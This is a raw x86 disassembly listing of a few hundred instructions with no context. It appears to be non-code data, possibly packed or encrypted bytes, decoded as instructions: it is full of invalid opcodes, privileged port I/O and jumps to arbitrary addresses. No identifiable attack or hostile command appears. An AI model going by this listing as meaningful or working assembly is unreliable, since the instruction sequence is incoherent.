  41f13d:	cmp    eax,0x1a30949d
  41f142:	xor    ebp,DWORD PTR [edi+0x2f]
  41f145:	data16 cmp BYTE PTR [eax+ecx*4-0x175f60e9],bh
  41f14d:	stos   DWORD PTR es:[edi],eax
  41f14e:	push   es
  41f14f:	add    dl,BYTE PTR [edi+0x0]
  41f152:	icebp  
  41f153:	push   esp
  41f154:	mov    ch,0xab
  41f156:	push   edx
  41f157:	xor    esi,ebp
  41f159:	jnp    0x41f152
  41f15b:	test   BYTE PTR [eax],dh
  41f15d:	pop    ebx
  41f15e:	into   
  41f15f:	pop    ss
  41f160:	sti    
  41f161:	push   esp
  41f162:	mov    eax,ds:0x6b298a32
  41f167:	fldenv [edx]
  41f169:	jl     0x41f181
  41f16b:	fsub   st,st(4)
  41f16d:	push   ecx
  41f16e:	daa    
  41f16f:	shl    DWORD PTR ds:0x51cae08,0x12
  41f176:	and    al,BYTE PTR [ebx]
  41f178:	jge    0x41f1d9
  41f17a:	call   0xea95578b
  41f17f:	test   eax,0xed5da7d7
  41f184:	lods   eax,DWORD PTR ds:[esi]
  41f185:	aaa    
  41f186:	and    dl,BYTE PTR [edi+eiz*8+0x9]
  41f18a:	pop    edx
  41f18b:	sbb    eax,DWORD PTR [esi+0x28]
  41f18e:	or     BYTE PTR [eax+0x29],cl
  41f191:	pusha  
  41f192:	or     DWORD PTR [ebx+0x17892e80],esp
  41f198:	outs   dx,DWORD PTR ds:[esi]
  41f199:	mov    dh,0xea
  41f19b:	push   ds
  41f19c:	sahf   
  41f19d:	pop    ecx
  41f19e:	xchg   esi,eax
  41f19f:	pop    ss
  41f1a0:	mov    eax,ds:0x93d99a25
  41f1a5:	lods   al,BYTE PTR ds:[esi]
  41f1a6:	jae    0x41f188
  41f1a8:	xor    eax,0x1eb3d79
  41f1ad:	jno    0x41f1e1
  41f1af:	add    al,0x19
  41f1b1:	mov    DWORD PTR [eax],esp
  41f1b3:	xor    al,0xa
  41f1b5:	jle    0x41f20b
  41f1b7:	add    cl,BYTE PTR [edx]
  41f1b9:	push   esp
  41f1ba:	mov    edx,0x9806b50
  41f1bf:	out    dx,eax
  41f1c0:	inc    ebp
  41f1c1:	and    bl,BYTE PTR [eax]
  41f1c3:	xchg   ecx,eax
  41f1c4:	icebp  
  41f1c5:	fcom   st(5)
  41f1c7:	ror    ecx,0x96
  41f1ca:	jecxz  0x41f1ac
  41f1cc:	push   edi
  41f1cd:	es jb  0x41f214
  41f1d0:	xchg   DWORD PTR [edx-0x69],esp
  41f1d3:	xor    dh,cl
  41f1d5:	cmp    eax,0xfcc370d3
  41f1da:	mov    dl,0x66
  41f1dc:	cmp    DWORD PTR [edi-0x7dcc983a],eax
  41f1e2:	mov    edx,0x51c5986d
  41f1e7:	out    0x85,eax
  41f1e9:	jns    0x41f1ff
  41f1eb:	jb     0x41f217
  41f1ed:	jecxz  0x41f174
  41f1ef:	icebp  
  41f1f0:	push   0xffffffae
  41f1f2:	xor    bl,BYTE PTR [edx+ebp*1+0x1d]
  41f1f6:	shl    DWORD PTR [edx-0x2c],0x18
  41f1fa:	jmp    FWORD PTR [edi]
  41f1fc:	into   
  41f1fd:	scas   eax,DWORD PTR es:[edi]
  41f1fe:	aaa    
  41f1ff:	rcr    edx,1
  41f201:	enter  0xc0e1,0xb0
  41f205:	out    dx,eax
  41f206:	rcl    al,0xfa
  41f209:	pop    DWORD PTR [esi]
  41f20b:	sar    DWORD PTR [ebp+0x7],1
  41f20e:	out    0xd6,al
  41f210:	or     al,0x0
  41f212:	es repnz mov dl,0xbc
  41f216:	inc    esi
  41f217:	(bad)  
  41f219:	add    DWORD PTR [ebx],0x84befe79
  41f21f:	cmp    DWORD PTR [ebx+0x12b6f9f6],0x8
  41f226:	and    al,0x91
  41f228:	push   edx
  41f229:	(bad)  [ebp-0x77]
  41f22c:	mov    bh,0xb0
  41f22e:	mov    al,0x6f
  41f230:	xchg   edi,eax
  41f231:	or     BYTE PTR [ebx+0x16],dh
  41f234:	adc    al,0x1d
  41f236:	mov    ds:0x24dadb7,al
  41f23b:	pop    ebx
  41f23c:	hlt    
  41f23d:	adc    al,0xe2
  41f23f:	xchg   BYTE PTR [edi-0x7b],bl
  41f242:	sbb    bl,cl
  41f244:	arpl   WORD PTR [eax+0x34],cx
  41f247:	fcmovnb st,st(6)
  41f249:	cmp    BYTE PTR [eax+0x15],dh
  41f24c:	test   al,0x18
  41f24e:	aaa    
  41f24f:	bound  ecx,QWORD PTR es:[ebx]
  41f252:	fmul   QWORD PTR [eax+0x49380369]
  41f258:	std    
  41f259:	rcl    BYTE PTR [esi],1
  41f25b:	fdivr  st,st(3)
  41f25d:	and    edi,ecx
  41f25f:	push   esi
  41f260:	ret    
  41f261:	mov    esi,0x4a01b769
  41f266:	ins    BYTE PTR es:[edi],dx
  41f267:	in     eax,dx
  41f268:	in     al,0x39
  41f26a:	leave  
  41f26b:	bound  edi,QWORD PTR [esi-0x6d]
  41f26e:	out    0x24,eax
  41f270:	inc    esp
  41f271:	dec    eax
  41f272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f273:	jecxz  0x41f2f4
  41f275:	ffreep st(3)
  41f277:	arpl   di,si
  41f279:	push   cs
  41f27a:	and    eax,0x881b8157
  41f27f:	mov    dl,0x1d
  41f281:	shl    DWORD PTR [eax+0x4f],1
  41f284:	sbb    al,0xce
  41f286:	js     0x41f25a
  41f288:	sahf   
  41f289:	shl    DWORD PTR [ebx],cl
  41f28b:	retf   
  41f28c:	ret    0x6a0a
  41f28f:	loopne 0x41f282
  41f291:	call   0xf949:0x6a55badd
  41f298:	inc    eax
  41f299:	ins    BYTE PTR es:[edi],dx
  41f29a:	jg     0x41f25f
  41f29c:	out    dx,eax
  41f29d:	inc    edi
  41f29e:	in     eax,0x74
  41f2a0:	push   0x6
  41f2a2:	int    0xfa
  41f2a4:	adc    eax,0x26123f24
  41f2a9:	dec    ebx
  41f2aa:	inc    edi
  41f2ab:	in     eax,dx
  41f2ac:	push   ecx
  41f2ad:	sbb    DWORD PTR [ebx+0x18],edx
  41f2b0:	pop    eax
  41f2b1:	es cmp eax,0x1cea7367
  41f2b7:	ror    DWORD PTR [edx],1
  41f2b9:	popf   
  41f2ba:	les    ecx,FWORD PTR [ebx+ebx*2]
  41f2bd:	or     eax,0xfd8f9751
  41f2c2:	bound  edi,QWORD PTR [edx-0x3]
  41f2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2c6:	dec    esi
  41f2c7:	fcomi  st,st(1)
  41f2c9:	lds    ebx,FWORD PTR [ecx-0x21]
  41f2cc:	and    al,0xa7
  41f2ce:	icebp  
  41f2cf:	inc    ecx
  41f2d0:	nop
  41f2d1:	push   eax
  41f2d2:	rcl    esp,cl
  41f2d4:	inc    ebp
  41f2d5:	lahf   
  41f2d6:	xor    al,0x91
  41f2d8:	stos   BYTE PTR es:[edi],al
  41f2d9:	test   DWORD PTR [edi-0x1d],edi
  41f2dc:	popa   
  41f2dd:	js     0x41f2ad
  41f2df:	sub    BYTE PTR [edx-0xe],al
  41f2e2:	inc    edi
  41f2e3:	inc    esi
  41f2e4:	or     BYTE PTR [ebp+0x229710cf],cl
  41f2ea:	sahf   
  41f2eb:	enter  0xd1b7,0x5c
  41f2ef:	or     al,0x10
  41f2f1:	xor    DWORD PTR [ebp-0x1927b470],esp
  41f2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2f8:	icebp  
  41f2f9:	call   FWORD PTR [eax]
  41f2fb:	jo     0x41f2ed
  41f2fd:	arpl   dx,ax
  41f2ff:	fisub  WORD PTR [ebx+0x157ade47]
  41f305:	xor    al,0xe2
  41f307:	sahf   
  41f308:	cmp    ebx,ebx
  41f30a:	imul   BYTE PTR [edx]
  41f30c:	inc    esp
  41f30d:	pop    edx
  41f30e:	and    al,0x93
  41f310:	mov    ah,0x46
  41f312:	lock bound ebx,QWORD PTR [esi-0x1e]
  41f316:	push   cs
  41f317:	push   ds
  41f318:	jle    0x41f335
  41f31a:	retf   0x890c
  41f31d:	inc    eax
  41f31e:	pop    ecx
  41f31f:	inc    edx
  41f320:	mov    edx,0xc16f37ec
  41f325:	fimul  WORD PTR [esi]
  41f327:	dec    edi
  41f328:	sbb    esi,DWORD PTR [ebx]
  41f32a:	call   DWORD PTR [edi-0x4a1f3304]
  41f330:	stc    
  41f331:	cmp    BYTE PTR [edi+ebp*2+0x3c685155],ch
  41f338:	pop    esp
  41f339:	fst    DWORD PTR [ebx]
  41f33b:	mov    ebx,0x609a7bc6
  41f340:	cmc    
  41f341:	or     DWORD PTR [edx-0x5b],esp
  41f344:	push   ebp
  41f345:	mov    ebx,0xc30b976a
  41f34a:	dec    eax
  41f34b:	scas   al,BYTE PTR es:[edi]
  41f34c:	lods   eax,DWORD PTR ds:[esi]
  41f34d:	mov    ah,0x14
  41f34f:	call   0xa37ca4f0
  41f354:	lock pop ss
  41f356:	cmp    eax,0xc2f74ff4
  41f35b:	xchg   esp,eax
  41f35c:	sub    BYTE PTR [ebx],al
  41f35e:	ja     0x41f2f6
  41f360:	jbe    0x41f330
  41f362:	xchg   esi,eax
  41f363:	cmp    al,0x64
  41f365:	mov    bl,0x64
  41f367:	jo     0x41f39a
  41f369:	jle    0x41f381
  41f36b:	cmp    al,0xa9
  41f36d:	add    DWORD PTR [ecx+0x6d0d0bfb],ecx
  41f373:	in     al,0x34
  41f375:	push   ebp
  41f376:	les    ecx,FWORD PTR [eax-0x7a4c1576]
  41f37c:	sbb    bh,BYTE PTR [edx-0x18]
  41f37f:	adc    BYTE PTR [esp+ecx*1],0x8
  41f383:	push   ds
  41f384:	fcmove st,st(4)
  41f386:	push   ebx
  41f387:	sub    BYTE PTR [ecx+0x47],bl
  41f38a:	out    dx,al
  41f38b:	ins    DWORD PTR es:[edi],dx
  41f38c:	adc    DWORD PTR [ebx+ecx*1-0x29],ebx
  41f390:	mov    edx,0x5c80977d
  41f395:	lock std 
  41f397:	dec    eax
  41f398:	jmp    0x41f361
  41f39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f39b:	lock mov cl,0x9b
  41f39e:	and    cl,al
  41f3a0:	inc    eax
  41f3a1:	arpl   WORD PTR [ebp-0x20],dx
  41f3a4:	cmc    
  41f3a5:	sub    DWORD PTR [ebx+0x13725d7a],ebp
  41f3ab:	cs pop ebx
  41f3ad:	sub    ah,BYTE PTR [ebp-0x17]
  41f3b0:	xor    ax,0xd036
  41f3b4:	adc    dl,BYTE PTR [edi+0x2f15bbb4]
  41f3ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3bb:	test   ah,bl
  41f3bd:	scas   eax,DWORD PTR es:[edi]
  41f3be:	inc    ecx
  41f3bf:	add    BYTE PTR [ebx-0x7a68f268],0x1a
  41f3c6:	dec    edx
  41f3c7:	pop    ss
  41f3c8:	cmp    esp,DWORD PTR [edi+0x68b90b47]
  41f3ce:	xor    edx,esi
  41f3d0:	mov    ecx,0xc55f374
  41f3d5:	sbb    BYTE PTR [edi+0x1cd6d1f],al
  41f3db:	sub    esp,DWORD PTR [esi+ebx*8+0x290ea77]
  41f3e2:	(bad)  
  41f3e3:	cmp    al,0x6f
  41f3e5:	push   0x87449823
  41f3ea:	ror    DWORD PTR [ebp-0x5e203a45],cl
  41f3f0:	cmp    DWORD PTR [ebp+esi*2-0xb],edx
  41f3f4:	fadd   st,st(4)
  41f3f6:	mov    bl,0xdd
  41f3f8:	mov    ecx,0x3b7f9390
  41f3fd:	popf   
  41f3fe:	int3   
  41f3ff:	in     al,0x1a
  41f401:	dec    ebx
  41f402:	repz xchg ebp,eax
  41f404:	fist   DWORD PTR ds:0xb1ffefd6
  41f40a:	(bad)  
  41f40b:	mov    dl,0xb4
  41f40d:	and    eax,0x71666a6b
  41f412:	int3   
  41f413:	test   DWORD PTR [ebx],edi
  41f415:	xor    ch,dh
  41f417:	push   esp
  41f418:	leave  
  41f419:	fnstsw WORD PTR [esi+eiz*1+0x3b]
  41f41d:	das    
  41f41e:	mov    bl,0x93
  41f420:	stos   BYTE PTR es:[edi],al
  41f421:	sbb    al,0xef
  41f423:	fdivr  DWORD PTR [esp+eiz*2]
  41f426:	sbb    dh,BYTE PTR [ebx+0x476586c5]
  41f42c:	or     BYTE PTR [ebp+0x4b1858f7],ch
  41f432:	pop    ebx
  41f433:	pop    ecx
  41f434:	test   bh,ah
  41f436:	test   BYTE PTR [eax],0xf3
  41f439:	xchg   esp,eax
  41f43a:	aad    0xe
  41f43c:	mov    al,0x25
  41f43e:	adc    BYTE PTR [ecx],cl
  41f440:	xor    ah,ch
  41f442:	push   0xffffffa2
  41f444:	push   ebx
  41f445:	cmp    al,0x72
  41f447:	jl     0x41f444
  41f449:	dec    ebp
  41f44a:	push   edi
  41f44b:	pop    es
  41f44c:	sahf   
  41f44d:	push   ebx
  41f44e:	and    esi,esp
  41f450:	adc    ah,ch
  41f452:	and    cl,BYTE PTR [ebx+0x38]
  41f455:	mov    dl,0x30
  41f457:	(bad)
  41f45b:	(bad)  
  41f45c:	or     al,0x6e
  41f45e:	stos   DWORD PTR es:[edi],eax
  41f45f:	out    0xd7,al
  41f461:	ins    BYTE PTR es:[edi],dx
  41f462:	or     eax,0x22234869
  41f467:	cli    
  41f468:	dec    esi
  41f469:	jl     0x41f46f
  41f46b:	pop    ecx
  41f46c:	leave  
  41f46d:	add    al,0x70
  41f46f:	bound  esi,QWORD PTR [ecx-0x53e24975]
  41f475:	loopne 0x41f42e
  41f477:	adc    al,0x5a
  41f479:	and    ah,0x57
  41f47c:	(bad)  
  41f47d:	or     BYTE PTR [edi],al
  41f47f:	pop    ebx
  41f480:	imul   edx,DWORD PTR [ebx],0x4
  41f483:	retf   0xd7d2
  41f486:	adc    BYTE PTR [ecx-0x4c9a46dc],0xf8
  41f48d:	aam    0xe1
  41f48f:	jmp    0x517:0xca7365d2
  41f496:	shr    DWORD PTR [ebp-0x51],0x5
  41f49a:	out    dx,eax
  41f49b:	mov    ah,0x84
  41f49d:	in     al,0x90
  41f49f:	(bad)  
  41f4a0:	int3   
  41f4a1:	push   ebx
  41f4a2:	enter  0x1041,0x70
  41f4a6:	div    BYTE PTR [ebx]
  41f4a8:	imul   ebp,DWORD PTR [edx+0x3c2e9223],0xffffff9a
  41f4af:	sbb    eax,0xe7c4edcc
  41f4b4:	jl     0x41f49a
  41f4b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4b7:	jnp    0x41f501
  41f4b9:	push   ds
  41f4ba:	div    BYTE PTR [eax-0x62c5eae]
  41f4c0:	outs   dx,BYTE PTR ds:[esi]
  41f4c1:	imul   edi,DWORD PTR [edx-0x6cc93409],0x7c28708
  41f4cb:	mov    ah,0x2d
  41f4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ce:	dec    eax
  41f4cf:	xor    dh,BYTE PTR [edx]
  41f4d1:	mov    edx,0x55d6c17b
  41f4d6:	inc    ebx
  41f4d7:	inc    ebp
  41f4d8:	push   edx
  41f4d9:	jmp    0x41f517
  41f4db:	pop    esp
  41f4dc:	mov    fs,WORD PTR ds:0x9d59a08b
  41f4e2:	mov    eax,DWORD PTR [ebx]
  41f4e4:	ret    0x4e93
  41f4e7:	adc    al,0xc8
  41f4e9:	mov    WORD PTR [ebx],?
  41f4eb:	stos   DWORD PTR es:[edi],eax
  41f4ec:	push   0xe0c7efb8
  41f4f1:	sbb    al,0x1f
  41f4f3:	scas   al,BYTE PTR es:[edi]
  41f4f4:	outs   dx,BYTE PTR ds:[esi]
  41f4f5:	out    0x15,al
  41f4f7:	sbb    BYTE PTR [eax+0x63],bl
  41f4fa:	jnp    0x41f55c
  41f4fc:	cmp    eax,0x533f9175
  41f501:	test   al,0xaf
  41f503:	add    eax,ecx
  41f505:	mov    ah,0x5a
  41f507:	call   0xfdd0:0x176bac02
  41f50e:	or     DWORD PTR [edx],esp
  41f510:	in     eax,0xec
  41f512:	inc    esi
  41f513:	add    esp,eax
  41f515:	not    DWORD PTR [edx+0x51]
  41f518:	fnstenv [ebx+0x7a]
  41f51b:	push   esi
  41f51c:	add    ebp,eax
  41f51e:	or     eax,0xf33a82da
  41f523:	nop
  41f524:	push   eax
  41f525:	call   0x35a5966c
  41f52a:	add    al,0x83
  41f52c:	add    BYTE PTR [edi+ecx*8+0x45],al
  41f530:	pop    esp
  41f531:	jle    0x41f587
  41f533:	call   0xa6aa:0x5fec4c80
  41f53a:	mov    edx,0x6fc9c82d
  41f53f:	jne    0x41f5b4
  41f541:	jmp    0x41f53d
  41f543:	int3   
  41f544:	repnz stos BYTE PTR es:[edi],al
  41f546:	sub    al,0xd3
  41f548:	xor    ecx,DWORD PTR [eax*2-0x25b9e728]
  41f54f:	sbb    eax,0x96826ffa
  41f554:	into   
  41f555:	jl     0x41f5d1
  41f557:	jmp    0x41f53c
  41f559:	mov    dh,BYTE PTR [ebp+0x23bf19ba]
  41f55f:	out    0x65,al
  41f561:	adc    eax,0xb00b2f89
  41f566:	xor    al,0xb2
  41f568:	mov    eax,0x5d341db8
  41f56d:	call   0x1733e75b
  41f572:	cmp    ah,BYTE PTR [edx]
  41f574:	enter  0xde4d,0xf7
  41f578:	and    al,0x71
  41f57a:	jmp    0x38fca457
  41f57f:	bound  esi,QWORD PTR [edi]
  41f581:	and    WORD PTR [ebx+edx*1],bx
  41f585:	cmc    
  41f586:	stos   DWORD PTR es:[edi],eax
  41f587:	mov    cl,dh
  41f589:	jo     0x41f5be
  41f58b:	out    0x7b,eax
  41f58d:	cs popf 
  41f58f:	mov    BYTE PTR ss:[ecx-0x72],dh
  41f593:	push   ss
  41f594:	jl     0x41f584
  41f596:	cmp    ecx,ecx
  41f598:	in     al,dx
  41f599:	and    BYTE PTR [ebp+ebx*4+0x405d6cbb],0x1c
  41f5a1:	test   eax,0xec870ccf
  41f5a6:	rcr    DWORD PTR [ebx],0xa8
  41f5a9:	(bad)  
  41f5aa:	pop    esi
  41f5ab:	or     al,0xa6
  41f5ad:	scas   eax,DWORD PTR es:[edi]
  41f5ae:	jge    0x41f5a0
  41f5b0:	out    0xc7,eax
  41f5b2:	adc    edx,DWORD PTR [esi-0x31]
  41f5b5:	ins    BYTE PTR es:[edi],dx
  41f5b6:	sub    ebp,edi
  41f5b8:	les    edi,FWORD PTR [edx+0x55cc757a]
  41f5be:	out    0xdc,al
  41f5c0:	mov    al,ds:0xb924159f
  41f5c5:	add    al,dl
  41f5c7:	push   edx
  41f5c8:	xchg   esp,eax
  41f5c9:	(bad)  [eax-0x6df33273]
  41f5cf:	dec    edi
  41f5d0:	add    cl,bl
  41f5d2:	xchg   BYTE PTR [ebx+0x3173a9ad],bh
  41f5d8:	cld    
  41f5d9:	and    bl,BYTE PTR [edi]
  41f5db:	(bad)  
  41f5dd:	pop    DWORD PTR [ecx+ebx*1]
  41f5e0:	cmp    BYTE PTR [eax-0x31],bl
  41f5e3:	fst    QWORD PTR [ebx]
  41f5e5:	loope  0x41f64f
  41f5e7:	or     eax,0x13ad6259
  41f5ec:	xor    BYTE PTR [eax],al
  41f5ee:	sub    ecx,ecx
  41f5f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5f1:	test   al,0x65
  41f5f3:	mov    al,0x59
  41f5f5:	jge    0x41f5f9
  41f5f7:	jb     0x41f675
  41f5f9:	jns    0x41f620
  41f5fb:	repnz pop edx
  41f5fd:	cmp    BYTE PTR [eax-0x72],dh
  41f600:	cmp    BYTE PTR ds:0xd9e4aa2e,bl
  41f606:	xlat   BYTE PTR ds:[ebx]
  41f607:	adc    DWORD PTR [ebx+0x59],edx
  41f60a:	jl     0x41f629
  41f60c:	or     DWORD PTR [ecx-0x796a4219],esp
  41f612:	test   WORD PTR [esi+0x129a5928],0xb33b
  41f61b:	fsub   QWORD PTR [ebp-0x57]
  41f61e:	xor    bl,BYTE PTR [edi+0x73]
  41f621:	cmc    
  41f622:	lock je 0x41f677
  41f625:	lahf   
  41f626:	(bad)  
  41f627:	popa   
  41f628:	and    ebp,DWORD PTR [edi]
  41f62a:	fmul   DWORD PTR [edx+0x7d]
  41f62d:	sti    
  41f62e:	sub    ah,bh
  41f630:	sbb    cl,BYTE PTR [esp+edi*8-0x3a]
  41f634:	sub    edi,DWORD PTR [edi]
  41f636:	inc    ebx
  41f637:	jae    0x41f5c6
  41f639:	or     al,0x68
  41f63b:	jg     0x41f61e
  41f63d:	cdq    
  41f63e:	(bad)  
  41f640:	adc    edx,DWORD PTR [eax]
  41f642:	xchg   edi,eax
  41f643:	mov    al,ds:0xa436ed46
  41f648:	lahf   
  41f649:	jmp    0x341d2a50
  41f64e:	ins    BYTE PTR es:[edi],dx
  41f64f:	inc    ebx
  41f650:	mov    dl,0xb5
  41f652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f653:	mov    edx,0xb82cc4f7
  41f658:	jl     0x41f620
  41f65a:	je     0x41f612
  41f65c:	push   0x1b
  41f65e:	inc    esp
  41f660:	ret    
  41f661:	in     eax,0x47
  41f663:	mov    ds:0xee2e3bd,eax
  41f668:	mov    cl,0xf9
  41f66a:	mov    dl,0xcf
  41f66c:	jg     0x41f664
  41f66e:	aam    0x94
  41f670:	push   0xb
  41f672:	daa    
  41f673:	rcr    BYTE PTR [ebx+eax*1],cl
  41f676:	lods   eax,DWORD PTR ds:[esi]
  41f677:	dec    BYTE PTR [ebx+esi*4-0x10eab89d]
  41f67e:	mov    dh,0x6e
  41f680:	and    ebp,esp
  41f682:	jp     0x41f6e3
  41f684:	add    eax,0xf282af3e
  41f689:	jno    0x41f657
  41f68b:	jno    0x41f6ae
  41f68d:	dec    ebp
  41f68e:	scas   eax,DWORD PTR es:[edi]
  41f68f:	adc    al,0xbb
  41f691:	xor    DWORD PTR [ebx+0x28],esi
  41f694:	fsubr  st,st(0)
  41f696:	retf   0x8bd4
  41f699:	sbb    BYTE PTR [esi-0x3d311cae],ah
  41f69f:	and    eax,0xee2dcd1f
  41f6a4:	jne    0x41f63f
  41f6a6:	dec    edx
  41f6a7:	pop    es
  41f6a8:	retf   0x6950
  41f6ab:	and    al,0x28
  41f6ad:	sahf   
  41f6ae:	push   ecx
  41f6af:	in     eax,0xeb
  41f6b1:	sti    
  41f6b2:	test   BYTE PTR [esi+0x5f],0xb8
  41f6b6:	aas    
  41f6b7:	jae    0x41f703
  41f6b9:	shl    BYTE PTR [edi],cl
  41f6bb:	sub    BYTE PTR [esi+0xdb646ea],bl
  41f6c1:	jmp    0xf9bf:0x5b5ebeeb
  41f6c8:	or     eax,0x32c3ef62
  41f6cd:	add    eax,0x2d1bb45e
  41f6d2:	fwait
  41f6d3:	push   ecx
  41f6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6d5:	add    al,0xb3
  41f6d7:	stos   BYTE PTR es:[edi],al
  41f6d8:	aaa    
  41f6d9:	pop    ecx
  41f6da:	std    
  41f6db:	test   al,0xc
  41f6dd:	int3   
  41f6de:	hlt    
  41f6df:	lock imul edi,eax,0x2c
  41f6e3:	je     0x41f689
  41f6e5:	mov    esi,0xd1d8c213
  41f6ea:	cmp    al,0x51
  41f6ec:	add    esi,DWORD PTR [esi+0x5c28af96]
  41f6f2:	xchg   edx,eax
  41f6f3:	xchg   edi,eax
  41f6f4:	nop
  41f6f5:	jmp    FWORD PTR [eax+0x65]
  41f6f8:	xor    bl,BYTE PTR [edx]
  41f6fa:	push   edx
  41f6fb:	lds    edi,FWORD PTR [edi+edi*2-0x4e]
  41f6ff:	push   edi
  41f700:	cmp    DWORD PTR [eax],ecx
  41f702:	or     eax,0xeeb837df
  41f707:	fwait
  41f708:	push   ebx
  41f709:	xchg   esi,eax
  41f70a:	sub    ecx,DWORD PTR [esi+0x27]
  41f70d:	adc    al,ch
  41f70f:	data16 adc ah,ah
  41f712:	outs   dx,BYTE PTR ds:[esi]
  41f713:	and    cl,ch
  41f715:	pushf  
  41f716:	dec    ebp
  41f717:	add    esi,0xab0bb941
  41f71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f71e:	add    DWORD PTR [ecx*1-0x1bf29cd],edx
  41f725:	cli    
  41f726:	add    eax,0x26cce267
  41f72b:	or     DWORD PTR [esi-0x78],edx
  41f72e:	mov    eax,ds:0xdb973fe9
  41f733:	sub    al,0xd1
  41f735:	into   
  41f736:	or     ebp,DWORD PTR [edi-0x1c4f9e93]
  41f73c:	push   eax
  41f73d:	xchg   esp,eax
  41f73e:	clc    
  41f73f:	loopne 0x41f7a8
  41f741:	sbb    BYTE PTR [edx],bl
  41f743:	or     ebx,DWORD PTR [eax+eax*8]
  41f746:	mul    cl
  41f748:	adc    eax,0xd2b72e66
  41f74d:	sub    al,0x5b
  41f74f:	not    bh
  41f751:	loop   0x41f6e6
  41f753:	push   ebp
  41f754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f755:	fistp  WORD PTR [edi]
  41f757:	les    ebx,FWORD PTR [ebx]
  41f759:	and    dl,ah
  41f75b:	fs (bad) 
  41f75d:	sar    BYTE PTR [eax+0x515a2ff7],1
  41f763:	in     eax,dx
  41f764:	out    0x72,al
  41f766:	outs   dx,DWORD PTR ds:[esi]
  41f767:	and    BYTE PTR [ecx+0x71],ch
  41f76a:	das    
  41f76b:	xchg   ebp,eax
  41f76c:	sti    
  41f76d:	or     ecx,edi
  41f76f:	(bad)  
  41f770:	idiv   DWORD PTR [edi+0x35]
  41f773:	out    dx,eax
  41f774:	or     BYTE PTR [eax],cl
  41f776:	inc    ebx
  41f777:	and    al,0xa2
  41f779:	mov    esi,0x7dd8760f
  41f77e:	mov    al,ds:0x1d6c90d5
  41f783:	xchg   ebx,eax
  41f784:	push   ecx
  41f785:	in     ax,dx
  41f787:	xchg   ecx,eax
  41f788:	repnz cld 
  41f78a:	push   es
  41f78b:	push   edi
  41f78c:	mov    ah,0x6f
  41f78e:	cwde   
  41f78f:	pop    ss
  41f790:	shl    DWORD PTR [ebx+0x76],cl
  41f793:	sbb    al,0xe5
  41f795:	sbb    BYTE PTR [ebp+0x46],cl
  41f798:	rol    BYTE PTR [ebx+0x30],1
  41f79b:	jnp    0x41f79e
  41f79d:	ficomp DWORD PTR [edx-0x28]
  41f7a0:	mov    ebp,0x1ccef75d
  41f7a5:	mov    ebp,0xb3d1342f
  41f7aa:	inc    edx
  41f7ab:	mov    cs,WORD PTR [esi-0x54463de]
  41f7b1:	ss and bl,bl
  41f7b4:	push   esp
  41f7b5:	pop    ebx
  41f7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b7:	or     BYTE PTR [edi-0x401451e8],0x19
  41f7be:	cli    
  41f7bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7c0:	scas   eax,DWORD PTR es:[edi]
  41f7c1:	sub    eax,0x1727fde9
  41f7c6:	cmp    ecx,DWORD PTR [ecx+0x1b]
  41f7c9:	and    DWORD PTR [edx],eax
  41f7cb:	cmp    al,0x56
  41f7cd:	push   ecx
  41f7ce:	out    dx,eax
  41f7cf:	jb     0x41f803
  41f7d1:	hlt    
  41f7d2:	and    ebx,DWORD PTR [ebp+0x64b064e7]
  41f7d8:	sti    
  41f7d9:	dec    edi
  41f7da:	xor    ch,al
  41f7dc:	pop    esi
  41f7dd:	pop    edx
  41f7de:	dec    esp
  41f7df:	sti    
  41f7e0:	or     DWORD PTR [ebx],ebx
  41f7e2:	out    0x86,al
  41f7e4:	jmp    DWORD PTR [eax-0x2a]
  41f7e7:	ret    
  41f7e8:	scas   eax,DWORD PTR es:[edi]
  41f7e9:	dec    ecx
  41f7ea:	mov    WORD PTR ds:[esi+ecx*4-0x8],ds
  41f7ef:	jae    0x41f7d3
  41f7f1:	or     eax,0x772789b0
  41f7f6:	aad    0xe4
  41f7f8:	mov    ds,edx
  41f7fa:	adc    eax,0xfcd0b950
  41f7ff:	pop    DWORD PTR [esi-0x3f411076]
  41f805:	int    0x18
  41f807:	jae    0x41f846
  41f809:	dec    ebx
  41f80a:	fiadd  DWORD PTR [ebp+0x52]
  41f80d:	cs xchg ebp,eax
  41f80f:	popa   
  41f810:	mov    eax,0xb552a675
  41f815:	or     eax,0x6272a5d8
  41f81a:	inc    edx
  41f81b:	xor    eax,0xdd3111a7
  41f820:	add    bl,bh
  41f822:	push   ss
  41f823:	retf   
  41f824:	jge    0x41f7ab
  41f826:	pop    esi
  41f827:	xor    ah,cl
  41f829:	dec    eax
  41f82a:	out    dx,al
  41f82b:	push   edi
  41f82c:	push   ss
  41f82d:	addr16 push ebx
  41f82f:	mov    edi,0xd062255
  41f834:	sti    
  41f835:	stos   BYTE PTR es:[edi],al
  41f836:	jl     0x41f842
  41f838:	push   ss
  41f839:	and    ah,cl
  41f83b:	inc    esp
  41f83c:	cmp    al,0x9a
  41f83e:	jg     0x41f816
  41f840:	js     0x41f805
  41f842:	sub    eax,0x648870c9
  41f847:	fiadd  WORD PTR [ebp-0x2a6b9cea]
  41f84d:	and    dl,BYTE PTR [edx]
  41f84f:	and    BYTE PTR [ebx+0x194fd6a],bh
  41f855:	shl    al,1
  41f857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f858:	mov    ds:0x86190f24,eax
  41f85d:	cmc    
  41f85e:	xor    al,0x1f
  41f860:	sbb    edx,esi
  41f862:	sub    bl,BYTE PTR ds:0xe84d2a6c
  41f868:	pop    esi
  41f869:	sub    DWORD PTR [edx+0x61dea1a4],ebp
  41f86f:	inc    ebp
  41f870:	inc    ebp
  41f871:	sub    esp,DWORD PTR [edx-0x5457bf0]
  41f877:	jb     0x41f8ab
  41f879:	add    BYTE PTR [ebx],ch
